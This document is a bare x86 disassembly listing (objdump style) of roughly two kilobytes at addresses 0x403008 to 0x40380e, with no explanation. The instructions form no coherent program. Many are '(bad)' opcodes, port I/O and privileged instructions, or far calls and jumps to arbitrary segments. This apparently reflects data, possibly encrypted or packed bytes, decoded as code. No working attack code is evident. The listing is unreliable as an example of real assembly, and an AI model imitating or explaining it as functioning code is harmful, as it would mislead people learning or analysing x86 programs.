  403008:	mov    ebp,DWORD PTR [ebx+0x4]
  40300b:	popf   
  40300c:	add    DWORD PTR [edx+0x7a26fdb2],ebx
  403012:	inc    esi
  403013:	mov    ebx,0xabe994f
  403018:	mov    cl,0xb8
  40301a:	fnsave [eax-0x1f]
  40301d:	dec    ecx
  40301e:	xchg   DWORD PTR [ebx-0x37],esp
  403021:	jns    0x4030a2
  403023:	jnp    0x403058
  403025:	jge    0x40306b
  403027:	das    
  403028:	xchg   ecx,eax
  403029:	fisttp WORD PTR [edx]
  40302b:	ror    DWORD PTR [eax],1
  40302d:	sbb    eax,0x746b458b
  403032:	imul   edi,esi,0xb7f8c15c
  403038:	das    
  403039:	test   DWORD PTR [edi+0x46f60f27],0x2833a9da
  403043:	call   0x8f37:0x1829839e
  40304a:	and    esp,DWORD PTR [esi+0x12]
  40304d:	jecxz  0x402ff1
  40304f:	jo     0x4030d0
  403051:	pusha  
  403052:	mov    fs,WORD PTR [eax+0x6]
  403055:	adc    al,0x38
  403057:	out    dx,eax
  403058:	or     ebx,DWORD PTR [ebp+ecx*4-0x25]
  40305c:	push   cs
  40305d:	jmp    0x6f04:0xa6583eb5
  403064:	mov    ah,0xa8
  403066:	(bad)  [eax+0x3b]
  403069:	or     eax,0x8581db9a
  40306e:	sub    eax,0x5f1c3123
  403073:	cli    
  403074:	push   cs
  403075:	cmp    ah,BYTE PTR [ebx+eax*1]
  403078:	dec    ecx
  403079:	outs   dx,BYTE PTR ds:[esi]
  40307a:	xor    BYTE PTR [esi],dl
  40307c:	fisttp QWORD PTR [ebx-0x50ac5ba4]
  403082:	out    0x7,al
  403084:	mov    al,0x10
  403086:	dec    eax
  403087:	fsubr  DWORD PTR [ebx-0x8902cac]
  40308d:	rcl    BYTE PTR [ecx-0x2e],cl
  403090:	(bad)  
  403091:	shl    BYTE PTR [eax-0x1b],1
  403094:	and    BYTE PTR [ecx-0x3e47cc0d],0x72
  40309b:	popf   
  40309c:	jecxz  0x40304c
  40309e:	mov    ecx,0xe03305e7
  4030a3:	fiadd  DWORD PTR [esi+edx*8-0x4d]
  4030a7:	aad    0x2e
  4030a9:	(bad)  
  4030aa:	rcl    ch,0x8c
  4030ad:	adc    al,0x71
  4030af:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030b1:	pop    es
  4030b2:	stos   DWORD PTR es:[edi],eax
  4030b3:	mov    esp,DWORD PTR [esi+edi*8-0x205b8f2f]
  4030ba:	sbb    ebx,DWORD PTR [edi-0x76f01a27]
  4030c0:	sbb    ah,dl
  4030c2:	jg     0x403053
  4030c4:	ins    BYTE PTR es:[edi],dx
  4030c5:	in     eax,0x7f
  4030c7:	inc    ecx
  4030c8:	cmp    ebp,ebx
  4030ca:	mov    esp,0x542215ae
  4030cf:	mov    eax,ds:0x846119b6
  4030d4:	scas   eax,DWORD PTR es:[edi]
  4030d5:	pop    esi
  4030d6:	and    BYTE PTR [ebx],bh
  4030d8:	cld    
  4030d9:	sub    ch,BYTE PTR [edi]
  4030db:	imul   ebp,DWORD PTR [esi+0x4f],0x5c
  4030df:	int3   
  4030e0:	push   cs
  4030e1:	xchg   ebp,eax
  4030e2:	cmp    ah,BYTE PTR [eax]
  4030e4:	mov    al,BYTE PTR [esi+0x1c]
  4030e7:	jmp    0x5076e7ce
  4030ec:	or     BYTE PTR [edx+0x6b],dh
  4030ef:	jg     0x40314b
  4030f1:	jo     0x40316b
  4030f3:	mov    esp,0x32ff81c7
  4030f8:	push   edi
  4030f9:	pmaxub mm1,mm7
  4030fc:	jns    0x403127
  4030fe:	daa    
  4030ff:	outs   dx,BYTE PTR ds:[esi]
  403100:	jo     0x4030c5
  403102:	repz xchg ebp,eax
  403104:	popf   
  403105:	mov    ebp,0x440265a7
  40310a:	adc    ah,BYTE PTR [edi+esi*1]
  40310d:	pop    ebp
  40310e:	mov    DWORD PTR [ecx+0x55],ecx
  403111:	loope  0x4030e4
  403113:	push   es
  403114:	xor    eax,0x92b23122
  403119:	push   cs
  40311a:	imul   ebx,DWORD PTR [ecx+ebx*1-0x1a],0x5f
  40311f:	ss loop 0x40318f
  403122:	xor    bh,dh
  403124:	or     ebx,ecx
  403126:	ins    DWORD PTR es:[edi],dx
  403127:	pop    ecx
  403128:	mov    al,ds:0x6bcadaed
  40312d:	data16 clc 
  40312f:	push   edx
  403130:	jp     0x403110
  403132:	and    ecx,0xffffffc1
  403135:	fadd   QWORD PTR [esi]
  403137:	xrelease mov BYTE PTR [eax+eiz*2+0x72524571],0xef
  403140:	jmp    0xf099487a
  403145:	sub    edi,DWORD PTR [ebp-0x714a9a88]
  40314b:	pop    esi
  40314c:	jmp    0x7a10:0xa52ebd71
  403153:	push   ebx
  403154:	dec    ebx
  403155:	stc    
  403156:	jg     0x40313b
  403158:	mov    ebx,0xffc593aa
  40315d:	mov    edi,0x25d2e7e2
  403162:	out    0x21,al
  403164:	stos   BYTE PTR es:[edi],al
  403165:	out    0xfa,eax
  403167:	mov    edx,0xdfeb9757
  40316c:	add    DWORD PTR [esi+eax*2],ebp
  40316f:	pushf  
  403170:	or     ah,al
  403172:	repz sbb al,0xd4
  403175:	cld    
  403176:	outs   dx,DWORD PTR ds:[esi]
  403177:	push   ss
  403178:	push   cs
  403179:	dec    ebx
  40317a:	mov    ecx,ecx
  40317c:	cmp    eax,DWORD PTR [ebx+0x4f]
  40317f:	cmp    DWORD PTR [edx],edx
  403181:	ins    BYTE PTR es:[edi],dx
  403182:	push   edi
  403183:	mul    DWORD PTR [ebx-0x6]
  403186:	xchg   ecx,eax
  403187:	mov    ch,0xa7
  403189:	jl     0x403137
  40318b:	bound  eax,QWORD PTR [edx+0x48]
  40318e:	jo     0x403122
  403190:	(bad)  
  403191:	das    
  403192:	dec    eax
  403193:	cld    
  403194:	adc    al,0x95
  403196:	popa   
  403197:	scas   al,BYTE PTR es:[edi]
  403198:	inc    ebx
  403199:	mov    edi,DWORD PTR [ecx-0x724ecc65]
  40319f:	je     0x4031be
  4031a1:	leave  
  4031a2:	in     al,0x1
  4031a4:	es add eax,0x7c726133
  4031aa:	pop    ecx
  4031ab:	lods   al,BYTE PTR ds:[esi]
  4031ac:	sbb    esp,DWORD PTR [eax+eiz*4]
  4031af:	ja     0x4031a0
  4031b1:	ins    BYTE PTR es:[edi],dx
  4031b2:	xchg   esi,eax
  4031b3:	add    DWORD PTR [ebx],esi
  4031b5:	ja     0x40322a
  4031b7:	imul   esi,DWORD PTR [esi],0x7c
  4031ba:	adc    edx,DWORD PTR fs:[ecx-0x62]
  4031be:	fdiv   DWORD PTR [eax+0x33537de5]
  4031c4:	adc    ebp,ebx
  4031c6:	xchg   esp,eax
  4031c7:	push   edi
  4031c8:	jp     0x40316f
  4031ca:	mov    DWORD PTR [ebp-0x13],esi
  4031cd:	xchg   ebx,eax
  4031ce:	ret    0xd4ad
  4031d1:	aas    
  4031d2:	sbb    DWORD PTR [edi-0x6b78d5c5],0x8eed01d2
  4031dc:	jae    0x403238
  4031de:	mov    cl,0x78
  4031e0:	adc    eax,DWORD PTR ds:0x7511d846
  4031e6:	push   esp
  4031e7:	xor    BYTE PTR [si],bh
  4031ea:	test   BYTE PTR [ecx-0x7a54032e],dl
  4031f0:	fcmovnu st,st(5)
  4031f2:	push   eax
  4031f3:	jno    0x403252
  4031f5:	and    edi,DWORD PTR [edi+0x59256ee4]
  4031fb:	jo     0x403187
  4031fd:	inc    ebx
  4031fe:	fucomi st,st(1)
  403200:	mov    eax,ds:0x939ede6a
  403205:	mov    eax,0x4f28152b
  40320a:	out    0x5f,eax
  40320c:	int3   
  40320d:	test   al,0xc
  40320f:	scas   al,BYTE PTR es:[edi]
  403210:	dec    ecx
  403211:	aam    0xea
  403213:	in     eax,dx
  403214:	cmp    al,0x41
  403216:	daa    
  403217:	and    al,0x44
  403219:	lods   al,BYTE PTR ds:[esi]
  40321a:	sub    eax,0x540b1648
  40321f:	sar    BYTE PTR [ecx-0x13],cl
  403222:	sbb    al,0xd4
  403224:	add    eax,DWORD PTR [ebp+0x4d0e913c]
  40322a:	aaa    
  40322b:	stos   DWORD PTR es:[edi],eax
  40322c:	jge    0x4031b7
  40322e:	xlat   BYTE PTR ds:[ebx]
  40322f:	repnz xchg ecx,eax
  403231:	sub    al,0x6c
  403233:	mov    dl,0xb9
  403235:	es int 0x63
  403238:	fwait
  403239:	outs   dx,DWORD PTR ds:[si]
  40323b:	hlt    
  40323c:	aad    0x2d
  40323e:	lea    ebp,[edi-0x41]
  403241:	mov    eax,0xa8bd51fb
  403246:	dec    eax
  403247:	push   ecx
  403248:	mov    edx,0x6fe6bcbd
  40324d:	je     0x40326e
  40324f:	jecxz  0x40320b
  403251:	xchg   ebx,eax
  403252:	sar    DWORD PTR [eax],1
  403254:	mov    ch,0xc0
  403256:	into   
  403257:	push   esp
  403258:	or     bl,BYTE PTR [edx-0x72]
  40325b:	xor    BYTE PTR [ecx],ch
  40325d:	mov    eax,0x40183a00
  403262:	rol    BYTE PTR [edi+0x16b3d548],cl
  403268:	pop    ecx
  403269:	inc    esi
  40326a:	jne    0x40326f
  40326c:	ret    0x7069
  40326f:	rcr    DWORD PTR ds:[eax-0x63b37357],0xd9
  403277:	clc    
  403278:	adc    bl,BYTE PTR [esi+0x48]
  40327b:	call   0xe507:0xd15d514b
  403282:	lea    edx,[ecx]
  403284:	jmp    0x1ab77b04
  403289:	adc    BYTE PTR [ebx-0x34c3b05b],al
  40328f:	out    0xc,eax
  403291:	push   ds
  403292:	ret    
  403293:	ret    
  403294:	pop    es
  403295:	jge    0x403253
  403297:	imul   ebp,DWORD PTR [eax-0x586c2494],0x233234d6
  4032a1:	jb     0x403255
  4032a3:	xchg   edx,eax
  4032a4:	jp     0x403246
  4032a6:	jmp    0xe1b74f8f
  4032ab:	mov    cl,ah
  4032ad:	jp     0x403275
  4032af:	xchg   ebp,eax
  4032b0:	xchg   eax,eax
  4032b2:	sub    eax,0x8a2ba9f5
  4032b7:	popf   
  4032b8:	call   0x5c0c:0x329cb31d
  4032bf:	mov    eax,ds:0xb741e0ab
  4032c4:	and    bh,BYTE PTR [edi-0x42]
  4032c7:	aaa    
  4032c8:	arpl   WORD PTR fs:0x29d8b0a5,si
  4032cf:	pushf  
  4032d0:	and    eax,0xe70ef11b
  4032d5:	push   ds
  4032d6:	jns    0x4032f6
  4032d8:	sti    
  4032d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032da:	stc    
  4032db:	sub    edi,ebx
  4032dd:	cwde   
  4032de:	aad    0x5
  4032e0:	mov    dl,0xa5
  4032e2:	or     DWORD PTR [ebp+0x79],esi
  4032e5:	(bad)  
  4032e7:	ins    BYTE PTR es:[edi],dx
  4032e8:	stos   DWORD PTR es:[edi],eax
  4032e9:	mov    esp,0xb5b7e7c9
  4032ee:	mov    al,al
  4032f0:	arpl   WORD PTR [eax-0x491745b7],bx
  4032f6:	arpl   WORD PTR [edi+0x3aca948b],sp
  4032fc:	popa   
  4032fd:	fstp   QWORD PTR [ebp+edx*2+0x35110637]
  403304:	scas   eax,DWORD PTR es:[edi]
  403305:	es inc ebp
  403307:	and    esi,DWORD PTR [eax]
  403309:	push   esi
  40330a:	dec    ecx
  40330b:	(bad)  
  40330c:	rol    BYTE PTR [ecx-0x2682e93f],1
  403312:	xor    BYTE PTR [ebx+0x4f8c6c9e],0x4b
  403319:	div    BYTE PTR [esp+edi*4-0x3a]
  40331d:	or     edi,ebx
  40331f:	jp     0x403320
  403321:	push   0xba12b6cc
  403326:	fs ins BYTE PTR es:[edi],dx
  403328:	mov    eax,ds:0x21aa5f10
  40332d:	push   ecx
  40332e:	mov    WORD PTR [ecx],?
  403330:	and    BYTE PTR [edi],dl
  403332:	mov    bl,0x7d
  403334:	sar    BYTE PTR [ebp-0x61],1
  403337:	xchg   esp,eax
  403338:	or     ebp,DWORD PTR [eax+0x79]
  40333b:	sub    al,0x45
  40333d:	add    al,0x43
  40333f:	arpl   WORD PTR ds:0xf8e4d470,di
  403345:	push   esi
  403346:	cs (bad) 
  403348:	ins    BYTE PTR es:[edi],dx
  403349:	xchg   bp,ax
  40334b:	jge    0x40330a
  40334d:	add    ah,BYTE PTR [ecx+ecx*4+0x19]
  403351:	or     edi,edi
  403353:	pop    es
  403354:	aam    0x0
  403356:	pop    es
  403357:	cmp    eax,0xc8256563
  40335c:	ins    DWORD PTR es:[edi],dx
  40335d:	out    dx,al
  40335e:	test   eax,0xd49905e3
  403363:	mov    ds:0xe874dbb,al
  403368:	jp     0x403318
  40336a:	rol    DWORD PTR [ebp+0x6c],0x75
  40336e:	cwde   
  40336f:	gs xchg bh,bl
  403372:	fnstsw WORD PTR [eax+0x7c189adb]
  403378:	push   esi
  403379:	or     al,0x1
  40337b:	div    BYTE PTR [edx+0x22620b09]
  403381:	jne    0x4033fc
  403383:	ins    BYTE PTR es:[edi],dx
  403384:	dec    eax
  403385:	push   esp
  403386:	jecxz  0x403317
  403388:	xlat   BYTE PTR ds:[ebx]
  403389:	imul   ecx,edi,0xffffffa9
  40338c:	push   0xffffffc9
  40338e:	push   0x6aa069eb
  403393:	sbb    al,0xff
  403395:	push   ebx
  403396:	mov    ecx,gs
  403398:	add    eax,0xe5644572
  40339d:	cmp    eax,DWORD PTR [edi-0xef1486a]
  4033a3:	ret    0x80f8
  4033a6:	aam    0xad
  4033a8:	inc    ebx
  4033a9:	hlt    
  4033aa:	add    al,ch
  4033ac:	xchg   ebp,eax
  4033ad:	rcr    ebp,cl
  4033af:	lods   al,BYTE PTR ds:[esi]
  4033b0:	mov    eax,ds:0x4fab596b
  4033b5:	mov    ch,BYTE PTR [ecx+0xb]
  4033b8:	mov    eax,ds:0xca8ab9d2
  4033bd:	cs mov dh,0xb4
  4033c0:	xchg   esi,eax
  4033c1:	iret   
  4033c2:	lds    edi,FWORD PTR [edi+0x714f73eb]
  4033c8:	(bad)  
  4033c9:	xor    eax,0xa4c91f41
  4033ce:	jno    0x4033b8
  4033d0:	fs (bad) 
  4033d2:	clc    
  4033d3:	addr16 retf 
  4033d5:	jo     0x4033b8
  4033d7:	and    ch,0xf4
  4033da:	call   0x6b9d:0x220967e9
  4033e1:	shl    ebx,0x8
  4033e4:	push   esi
  4033e5:	or     edi,DWORD PTR [esi]
  4033e7:	dec    edx
  4033e8:	stc    
  4033e9:	mov    esp,0x45d3401b
  4033ee:	sbb    BYTE PTR [esi+0x70c113c3],bh
  4033f4:	pusha  
  4033f5:	push   ds
  4033f6:	daa    
  4033f7:	or     esp,esp
  4033f9:	dec    ebp
  4033fa:	push   esp
  4033fb:	ret    0x2ea
  4033fe:	cmp    eax,0xfb3c2048
  403403:	push   esp
  403404:	addr16 inc esi
  403406:	and    al,0xb0
  403408:	fistp  DWORD PTR ds:0xcb085135
  40340e:	cmp    bl,BYTE PTR [edi-0x4f06f1b3]
  403414:	fadd   DWORD PTR [edx-0x5217d2a5]
  40341a:	out    0xb8,eax
  40341c:	cmp    eax,0x545332d6
  403421:	inc    ebp
  403422:	(bad)  
  403423:	imul   ebx,DWORD PTR [ebx-0x3d],0xffffffa6
  403427:	sahf   
  403428:	mov    eax,ds:0x29cc4367
  40342d:	dec    edi
  40342e:	js     0x4033b1
  403430:	cmp    ecx,DWORD PTR [edi+0x2d]
  403433:	ins    DWORD PTR es:[edi],dx
  403434:	fild   WORD PTR [edx+0x2a66e594]
  40343a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40343b:	add    BYTE PTR [edx-0x7a],ch
  40343e:	xchg   edi,eax
  40343f:	test   eax,0xbb1942c5
  403444:	test   al,0xad
  403446:	mov    eax,0xdfc1df3c
  40344b:	jnp    0x40348a
  40344d:	sub    eax,0x867e0bdb
  403452:	mov    ds:0xe87a1213,eax
  403457:	into   
  403458:	jno    0x403430
  40345a:	jb     0x4034a2
  40345c:	sahf   
  40345d:	fcom   QWORD PTR [ecx-0x27]
  403460:	aas    
  403461:	sub    esi,DWORD PTR [eax]
  403463:	push   0x45
  403465:	jno    0x4033f6
  403467:	ja     0x40349f
  403469:	xchg   BYTE PTR [edi+edi*2],cl
  40346c:	jge    0x4034be
  40346e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40346f:	or     al,0x78
  403471:	push   eax
  403472:	xchg   ecx,eax
  403473:	push   ecx
  403474:	fisub  WORD PTR [ecx]
  403476:	xor    dh,dh
  403478:	xor    BYTE PTR [esi-0x8a03551],0xc2
  40347f:	fisubr WORD PTR ds:0x4805c229
  403485:	xor    dh,ch
  403487:	cmp    bl,BYTE PTR [esi+0x7da1ad9]
  40348d:	cld    
  40348e:	push   ebp
  40348f:	lahf   
  403490:	cmc    
  403491:	mov    edx,0x5d254a63
  403496:	neg    BYTE PTR ss:[esp+edi*8]
  40349a:	retf   0xf776
  40349d:	jb     0x40345e
  40349f:	adc    ch,dh
  4034a1:	stos   BYTE PTR es:[edi],al
  4034a2:	aaa    
  4034a3:	mov    dl,0xd7
  4034a5:	inc    edx
  4034a6:	mov    eax,ds:0xbb0b0103
  4034ab:	xor    esp,ecx
  4034ad:	mov    ch,0xce
  4034af:	sbb    al,0x3a
  4034b1:	sbb    BYTE PTR [esi],0xd0
  4034b4:	or     bl,0xd0
  4034b7:	xor    eax,0xbbcf9bac
  4034bc:	jecxz  0x4034e1
  4034be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034bf:	scas   eax,DWORD PTR es:[edi]
  4034c0:	ins    BYTE PTR es:[edi],dx
  4034c1:	push   0x5aaa3d81
  4034c6:	or     ebx,edx
  4034c8:	stos   DWORD PTR es:[edi],eax
  4034c9:	add    DWORD PTR [edi],ebx
  4034cb:	in     al,dx
  4034cc:	enter  0x8f1f,0xbe
  4034d0:	pop    ecx
  4034d1:	test   eax,0x4d41184e
  4034d6:	adc    eax,0xd3f7230c
  4034db:	(bad)  
  4034dc:	repnz inc DWORD PTR [edi]
  4034df:	cmc    
  4034e0:	(bad)  
  4034e2:	int3   
  4034e3:	cli    
  4034e4:	arpl   WORD PTR [edx+eax*1+0x7669fac6],si
  4034eb:	test   eax,0x904f4910
  4034f0:	jbe    0x4034f9
  4034f2:	stc    
  4034f3:	dec    edx
  4034f4:	mov    ebx,0x630469aa
  4034f9:	stc    
  4034fa:	sub    cl,BYTE PTR [ebp+0x5e73d34a]
  403500:	imul   esp,DWORD PTR [ebp-0x7052cb86],0xffffff81
  403507:	mov    DWORD PTR [ebp+0x3d002f6b],ebp
  40350d:	push   esp
  40350e:	push   ds
  40350f:	bound  ebx,QWORD PTR [edi+0x24]
  403512:	sbb    BYTE PTR gs:[eax+0x40],bl
  403516:	idiv   DWORD PTR [ebp+0x11669c9c]
  40351c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40351d:	mov    DWORD PTR [eax-0x159ba99a],eax
  403523:	xchg   ecx,eax
  403524:	jae    0x403574
  403526:	xor    al,0x64
  403528:	sbb    edx,ebx
  40352a:	in     al,0xdc
  40352c:	jge    0x4034eb
  40352e:	push   0x175e5e58
  403533:	gs mov bh,0xf4
  403536:	adc    ch,BYTE PTR [ebp-0xc]
  403539:	iret   
  40353a:	enter  0xd611,0x69
  40353e:	test   eax,0x8c027da9
  403543:	and    DWORD PTR [ebp-0x80],0xc99e74aa
  40354a:	(bad)  
  40354b:	and    esi,DWORD PTR [edi+0x51236643]
  403551:	push   0xd0430306
  403556:	jmp    0xa00f3537
  40355b:	repz and BYTE PTR [ebp-0x3c],0x2f
  403560:	outs   dx,BYTE PTR ds:[esi]
  403561:	loopne 0x4035a5
  403563:	jno    0x4035bd
  403565:	in     eax,0x9d
  403567:	clc    
  403568:	dec    ebx
  403569:	ja     0x40355e
  40356b:	pop    ecx
  40356c:	cdq    
  40356d:	mov    dh,0xe7
  40356f:	push   esp
  403570:	les    edx,FWORD PTR [esi+0xf]
  403573:	repnz cmps DWORD PTR cs:[esi],DWORD PTR es:[edi]
  403576:	mov    eax,0xc05bd0b6
  40357b:	add    ah,cl
  40357d:	inc    edi
  40357e:	push   es
  40357f:	xchg   esp,eax
  403580:	or     al,ch
  403582:	jb     0x403591
  403584:	mov    dh,0xe2
  403586:	sub    eax,0x65073d12
  40358b:	push   edx
  40358c:	data16 (bad) 
  40358e:	outs   dx,DWORD PTR ds:[esi]
  40358f:	in     al,dx
  403590:	(bad)  
  403591:	out    0x3d,eax
  403593:	pop    eax
  403594:	jl     0x403603
  403596:	(bad)  
  403597:	psadbw mm0,mm5
  40359a:	add    bh,BYTE PTR [ecx+0x50606dde]
  4035a0:	in     eax,dx
  4035a1:	int3   
  4035a2:	lea    ebp,[ebx-0x47]
  4035a5:	and    ebx,ebp
  4035a7:	aad    0x89
  4035a9:	mov    dl,0x8f
  4035ab:	push   0x6bf480c
  4035b0:	ret    0x7b60
  4035b3:	call   0xb0b0:0xb958fa74
  4035ba:	jbe    0x4035ff
  4035bc:	mov    ebp,0x982b439
  4035c1:	fsubrp st(5),st
  4035c3:	and    dl,bl
  4035c5:	cld    
  4035c6:	push   ss
  4035c7:	inc    eax
  4035c8:	cdq    
  4035c9:	push   0x68
  4035cb:	cdq    
  4035cc:	(bad)  
  4035cd:	pop    esp
  4035ce:	mov    ebx,0x8b8aa32d
  4035d3:	call   0x4b33:0xb1df99f8
  4035da:	in     al,0xf6
  4035dc:	xor    al,0x19
  4035de:	mov    ds:0x1a773161,al
  4035e3:	test   BYTE PTR [eax-0x5323ce9],bh
  4035e9:	shr    BYTE PTR [ebx],cl
  4035eb:	inc    esp
  4035ec:	sti    
  4035ed:	push   DWORD PTR [ebx]
  4035ef:	cdq    
  4035f0:	mov    al,0x70
  4035f2:	repnz adc al,0xe
  4035f5:	ss push ss
  4035f7:	lods   al,BYTE PTR ds:[esi]
  4035f8:	stos   DWORD PTR es:[edi],eax
  4035f9:	outs   dx,BYTE PTR ds:[esi]
  4035fa:	dec    BYTE PTR ds:0xec0571a4
  403600:	pop    ds
  403601:	push   0xffffff96
  403603:	inc    edi
  403604:	sub    DWORD PTR [esi-0x3],ebp
  403607:	or     esp,DWORD PTR [eax-0x4e]
  40360a:	adc    eax,0xc3184ad0
  40360f:	ret    
  403610:	mov    eax,ds:0xd9393920
  403615:	cwde   
  403616:	mov    DWORD PTR [eax],esi
  403618:	leave  
  403619:	popa   
  40361a:	mov    ah,0xcb
  40361c:	push   ds
  40361d:	xchg   ecx,eax
  40361e:	sahf   
  40361f:	sub    dl,BYTE PTR [edi+0x2d]
  403622:	in     eax,0x13
  403624:	xchg   ebx,eax
  403625:	fsubr  DWORD PTR fs:[esi-0x80]
  403629:	stc    
  40362a:	sub    al,0x73
  40362c:	jmp    0xc311:0x1ff59c44
  403633:	rcr    BYTE PTR [esi+0x269c4969],0x77
  40363a:	jmp    0x81a6:0x8607fd31
  403641:	jge    0x4035e2
  403643:	mov    cl,0x77
  403645:	xor    ebp,0x55
  403648:	mov    esp,0xe44bddc9
  40364d:	xchg   edi,eax
  40364e:	leave  
  40364f:	enter  0x9eab,0x20
  403653:	jmp    0x8c8ed148
  403658:	add    ecx,DWORD PTR [ebp-0x1]
  40365b:	adc    eax,0x41eefb5
  403660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403661:	inc    ebp
  403662:	imul   edi,DWORD PTR [esi+0x3d],0x4222332f
  403669:	sar    DWORD PTR [edi],cl
  40366b:	mov    ebx,0xaea46b36
  403670:	jns    0x40366a
  403672:	es and ah,cl
  403675:	add    DWORD PTR [ecx+0x3f],ebx
  403678:	mov    bh,0x98
  40367a:	push   esp
  40367b:	(bad)  
  40367c:	stc    
  40367d:	xor    bh,BYTE PTR [ebx+0x51e1d94]
  403683:	lahf   
  403684:	fistp  DWORD PTR [esi+0x1be79e12]
  40368a:	mov    ebx,0x94b8ea7b
  40368f:	xchg   DWORD PTR [ecx+0x6235ea6c],eax
  403695:	clc    
  403696:	in     al,0x2
  403698:	sbb    BYTE PTR [edi+0x426bf94],bl
  40369e:	data16 js 0x4036f8
  4036a1:	or     DWORD PTR [esi],esi
  4036a3:	adc    DWORD PTR [ebx],esp
  4036a5:	arpl   WORD PTR [edx-0x67],sp
  4036a8:	repz retf 
  4036aa:	gs jle 0x4036c7
  4036ad:	leave  
  4036ae:	push   ecx
  4036af:	inc    edi
  4036b0:	hlt    
  4036b1:	je     0x40366a
  4036b3:	aas    
  4036b4:	data16 fucom st(3)
  4036b7:	lods   eax,DWORD PTR ds:[esi]
  4036b8:	scas   al,BYTE PTR es:[edi]
  4036b9:	mov    DWORD PTR [ecx+eiz*1],eax
  4036bc:	mov    eax,DWORD PTR [ecx+0x71c74032]
  4036c2:	jmp    0x1ccb7f9c
  4036c7:	aad    0x9
  4036c9:	pop    es
  4036ca:	pop    ecx
  4036cb:	cmp    eax,0x2cd6409a
  4036d0:	dec    edx
  4036d1:	mov    ds:0xcef47262,eax
  4036d6:	test   al,0x38
  4036d8:	lods   eax,DWORD PTR ds:[esi]
  4036d9:	pop    eax
  4036da:	in     al,0x82
  4036dc:	(bad)  
  4036dd:	repnz sbb al,0xb8
  4036e0:	std    
  4036e1:	inc    BYTE PTR [esi+0x54d3f001]
  4036e7:	aad    0xa6
  4036e9:	add    eax,0xc6247bb1
  4036ee:	push   esp
  4036ef:	arpl   sp,si
  4036f1:	repz pop ss
  4036f3:	loopne 0x4036ca
  4036f5:	dec    ecx
  4036f6:	fdiv   DWORD PTR [ecx]
  4036f8:	repnz push esi
  4036fa:	test   al,0x4
  4036fc:	outs   dx,BYTE PTR ds:[esi]
  4036fd:	cmc    
  4036fe:	stc    
  4036ff:	sbb    eax,0x1b24042e
  403704:	ins    DWORD PTR es:[edi],dx
  403705:	ss dec ebp
  403707:	dec    eax
  403708:	lahf   
  403709:	push   es
  40370a:	mov    al,0x87
  40370c:	jbe    0x40375b
  40370e:	das    
  40370f:	or     esp,DWORD PTR [ebp-0x37]
  403712:	pushf  
  403713:	mov    BYTE PTR [ebp+0x20156b62],bl
  403719:	pop    edi
  40371a:	fst    DWORD PTR [ebx+eiz*4+0x71]
  40371e:	add    cl,BYTE PTR [edi+0x638d5771]
  403724:	call   0xac55:0x24ca5ab0
  40372b:	int    0xb6
  40372d:	fs in  eax,dx
  40372f:	mov    esp,0x42a54ef9
  403734:	push   eax
  403735:	daa    
  403736:	arpl   WORD PTR [ebx],sp
  403738:	cs pop edx
  40373a:	ror    BYTE PTR [ecx],1
  40373c:	mov    ecx,0xf364a495
  403741:	xchg   ebx,eax
  403742:	or     eax,0xd45ad9b5
  403747:	adc    eax,0xd682ca27
  40374c:	outs   dx,BYTE PTR ds:[esi]
  40374d:	add    edx,eax
  40374f:	fwait
  403750:	out    dx,eax
  403751:	sbb    BYTE PTR [esi],dh
  403753:	clc    
  403754:	les    ebx,FWORD PTR [ebx]
  403756:	nop
  403757:	pop    ebx
  403758:	or     BYTE PTR [ebp+ebp*1+0x23d4cc8e],dh
  40375f:	pop    ss
  403760:	add    al,0xe8
  403762:	jns    0x4036fd
  403764:	cld    
  403765:	cli    
  403766:	or     BYTE PTR [ebp-0x3e21f738],0x79
  40376d:	pop    ecx
  40376e:	inc    edi
  40376f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403770:	int3   
  403771:	test   DWORD PTR [ebp+0x42cc62b8],edi
  403777:	push   edx
  403778:	jb     0x40371b
  40377a:	fs or  cl,0x7d
  40377e:	loop   0x4037c0
  403780:	push   esi
  403781:	adc    BYTE PTR [edi],ch
  403783:	inc    ecx
  403784:	into   
  403785:	sbb    dh,BYTE PTR [edi+0x6f26f703]
  40378b:	aas    
  40378c:	add    bh,ch
  40378e:	pop    ebp
  40378f:	out    0xb3,al
  403791:	jo     0x4037e6
  403793:	ficomp WORD PTR [esi+0x4e]
  403796:	hlt    
  403797:	dec    eax
  403798:	(bad)  
  403799:	addr16 aaa 
  40379b:	repnz sbb ah,BYTE PTR [eax-0x5e27852b]
  4037a2:	mov    eax,0x83d0c195
  4037a7:	push   si
  4037a9:	sub    al,0x49
  4037ab:	fcmovb st,st(1)
  4037ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ae:	cmp    eax,0x8d1e2fe9
  4037b3:	jg     0x4037cf
  4037b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037b6:	mov    WORD PTR [ebp-0x6d5f6df7],gs
  4037bc:	mov    ebx,ss
  4037be:	cmp    ebp,ebp
  4037c0:	cmp    edi,DWORD PTR [esi+edx*2]
  4037c3:	mov    DWORD PTR [edi+0x79],0x114c5152
  4037ca:	inc    edx
  4037cb:	in     al,dx
  4037cc:	scas   eax,DWORD PTR es:[edi]
  4037cd:	hlt    
  4037ce:	mov    ebx,0x39693fad
  4037d3:	out    dx,al
  4037d4:	(bad)  
  4037d5:	add    edx,edi
  4037d7:	lds    ebx,FWORD PTR [ebp-0x5a5661ad]
  4037dd:	dec    esp
  4037de:	and    ch,ah
  4037e0:	push   eax
  4037e1:	hlt    
  4037e2:	cmp    ebx,DWORD PTR [ebp+0x5fecb2e4]
  4037e8:	inc    edi
  4037e9:	shr    BYTE PTR ds:0xd8072481,cl
  4037ef:	cmp    eax,DWORD PTR [edx+0x66]
  4037f2:	lds    edx,FWORD PTR [ecx-0x3dde07ed]
  4037f8:	inc    edx
  4037f9:	aad    0xef
  4037fb:	push   ebp
  4037fc:	sub    edx,DWORD PTR [edx+0x74]
  4037ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403800:	inc    edi
  403801:	aaa    
  403802:	and    DWORD PTR ds:0xd30dfd48,0xffffffe7
  403809:	dec    ebp
  40380a:	sbb    ebp,DWORD PTR fs:[ebx]
  40380d:	(bad)  
  40380e:	adc    eax,0xe383ee0f
